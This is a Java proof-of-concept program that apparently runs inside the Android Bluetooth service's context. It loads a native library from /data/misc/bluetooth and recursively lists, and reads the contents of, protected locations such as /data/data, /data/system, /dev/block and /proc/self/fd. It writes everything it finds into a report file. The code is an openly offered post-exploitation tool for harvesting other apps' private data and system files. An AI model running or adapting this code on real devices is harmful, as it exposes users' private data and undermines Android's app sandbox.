package com.poc;

import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class Main {
    private static final String TAG = "Inspector";
    private static final String OUTPUT_BASE = "/data/data/com.android.bluetooth/inspect_report/";
    private static final int MAX_READ_SIZE = 1024;

    private static BufferedWriter writer;
    private static long fileCount = 0, dirCount = 0, errorCount = 0;

    public static native String[] nativeListDirectory(String path);
    public static native String nativeReadFile(String path);

    static {
        String libPath = "/data/misc/bluetooth/libnative-inspector.so";
        try {
            System.load(libPath);
            System.err.println("[" + TAG + "] Loaded library from: " + libPath);
        } catch (UnsatisfiedLinkError e) {
            System.err.println("[" + TAG + "] Failed to load library: " + e);
            try {
                System.loadLibrary("native-inspector");
            } catch (UnsatisfiedLinkError e2) {
                System.err.println("[" + TAG + "] System.loadLibrary also failed.");
            }
        }
    }

    public static void main(String[] args) {
        System.err.println("[" + TAG + "] === Inspector started ===");
        try {
            File outDir = new File(OUTPUT_BASE);
            if (!outDir.exists()) outDir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String reportFile = OUTPUT_BASE + "report_" + timestamp + ".txt";
            writer = new BufferedWriter(new FileWriter(reportFile));
            writeHeader(reportFile);

            String[] targets = {
                "/dev/block",
                "/dev",
                "/data/misc",
                "/data/data",
                "/data/system",
                "/data/local",
                "/data/media",
                "/data/user",
                "/data/app",
                "/proc/self/fd",
                "/proc/self/map_files",
                "/proc/self/root/data/misc",
                "/proc/self/root/data/data"
            };

            for (String target : targets) {
                File f = new File(target);
                if (f.exists()) {
                    System.err.println("[" + TAG + "] Scanning: " + target);
                    writer.write("\n=== Scanning: " + target + " ===\n");
                    if (target.startsWith("/proc/self/fd") || target.startsWith("/proc/self/map_files")) {
                        scanSymlinkDir(f);
                    } else {
                        walkWithNative(f, 0);
                    }
                } else {
                    System.err.println("[" + TAG + "] Target does not exist: " + target);
                    writer.write("Target does not exist: " + target + "\n");
                }
            }

            writeFooter();
            System.err.println("[" + TAG + "] Finished. Files: " + fileCount + ", Dirs: " + dirCount + ", Errors: " + errorCount);
        } catch (Exception e) {
            System.err.println("[" + TAG + "] Fatal: " + e);
            try { if (writer != null) writer.write("FATAL: " + e.toString()); } catch (Exception ignored) {}
        } finally {
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
        }
    }

    private static void walkWithNative(File file, int depth) {
        if (depth > 20) return;
        try {
            if (file.isDirectory()) {
                dirCount++;
                writer.write("D " + file.getAbsolutePath() + "\n");
                writer.flush();

                File[] children = file.listFiles();
                if (children == null) {
                    String[] nativeEntries = nativeListDirectory(file.getAbsolutePath());
                    if (nativeEntries == null) {
                        writer.write("  [Cannot list directory (native failed)]\n");
                        return;
                    }
                    for (String entry : nativeEntries) {
                        String[] parts = entry.split("\\|");
                        if (parts.length < 2) continue;
                        String name = parts[0];
                        char type = parts[1].charAt(0);
                        File sub = new File(file, name);
                        if (type == 'L') {
                            writer.write("  L " + sub.getAbsolutePath() + " [skip]\n");
                            continue;
                        }
                        walkWithNative(sub, depth + 1);
                    }
                } else {
                    Arrays.sort(children);
                    for (File sub : children) {
                        try {
                            if (Files.isSymbolicLink(sub.toPath())) {
                                String linkTarget = Files.readSymbolicLink(sub.toPath()).toString();
                                writer.write("  L " + sub.getAbsolutePath() + " -> " + linkTarget + "\n");
                            } else {
                                walkWithNative(sub, depth + 1);
                            }
                        } catch (IOException e) {
                            writer.write("  L " + sub.getAbsolutePath() + " [broken]\n");
                        }
                    }
                }
            } else if (file.isFile()) {
                fileCount++;
                writer.write("F " + file.getAbsolutePath() + " (size=" + file.length() + ")\n");
                if (file.length() > 0 && file.canRead()) {
                    String content = nativeReadFile(file.getAbsolutePath());
                    if (content != null && !content.isEmpty()) {
                        writer.write("  [CONTENT_START]\n");
                        writer.write(content + "\n");
                        writer.write("  [CONTENT_END]\n");
                    } else {
                        writer.write("  [EMPTY or JNI read failed]\n");
                    }
                } else {
                    writer.write("  [EMPTY or UNREADABLE]\n");
                }
                writer.flush();
            } else {
                writer.write("S " + file.getAbsolutePath() + "\n");
            }
        } catch (Exception e) {
            errorCount++;
            System.err.println("[" + TAG + "] Error: " + e);
            try { writer.write("  [ERROR: " + e.getMessage() + "]\n"); } catch (Exception ignored) {}
        }
    }

    private static void scanSymlinkDir(File dir) {
        if (!dir.isDirectory()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            try {
                if (Files.isSymbolicLink(f.toPath())) {
                    String target = Files.readSymbolicLink(f.toPath()).toString();
                    writer.write("  L " + f.getName() + " -> " + target + "\n");
                } else {
                    writer.write("  " + f.getName() + "\n");
                }
            } catch (IOException e) {
                writer.write("  " + f.getName() + " [error]\n");
            }
        }
        try { writer.flush(); } catch (IOException ignored) {}
    }

    private static void writeHeader(String reportFile) throws IOException {
        writer.write("Comprehensive Inspector Report\n");
        writer.write("Generated: " + new Date() + "\n");
        writer.write("UID: " + android.os.Process.myUid() + "\n");
        writer.write("------------------------------------------------------------\n\n");
    }

    private static void writeFooter() throws IOException {
        writer.write("\n------------------------------------------------------------\n");
        writer.write("Summary: Dirs=" + dirCount + ", Files=" + fileCount + ", Errors=" + errorCount + "\n");
    }
}
